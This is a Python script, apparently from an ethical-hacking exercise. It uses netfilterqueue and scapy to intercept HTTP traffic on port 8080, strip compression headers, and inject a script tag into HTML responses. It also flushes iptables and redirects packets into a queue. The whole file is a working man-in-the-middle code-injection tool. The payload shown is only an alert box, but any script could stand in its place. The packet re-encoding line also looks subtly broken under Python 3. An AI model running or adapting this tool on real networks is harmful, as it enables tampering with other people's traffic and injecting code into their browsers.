#! /usr/bin/env python

#! usr/bin/env/ python

import netfilterqueue
import scapy.all as scapy
import re
import subprocess
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet) :
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try :
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 8080:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
                load = load.replace("HTTP/1.1","HTTP/1.0")
            elif scapy_packet[scapy.TCP].sport == 8080:
                print("[+] Response")
                injection_code = '<script>alert("This is Code_Injector << SCRIPTING PALYING</script>'
                load = load.replace("</body>",(injection_code + "</body>"))
                content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length,str(new_content_length))

            if load != scapy_packet[scapy.Raw].load :
                new_packet = set_load(scapy_packet,load)
                packet.set_payload(str(new_packet).encode())
        except UnicodeDecodeError :
            pass
    packet.accept()

def run() :
    try:
        print("Waiting for packets...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("Quitting...")
    # finally:
    #     queue.unbind()

if __name__ in "__main__" :
    subprocess.call(["sudo","iptables","--flush"])
    # subprocess.call(["sudo","iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","1"])
    # subprocess.call(["sudo","echo","1",">","/proc/sys/net/ipv4/ip_forward"])
    subprocess.call(["sudo","iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","1"])
    subprocess.call(["sudo","iptables","-I","INPUT","-j","NFQUEUE","--queue-num","1"])
    run()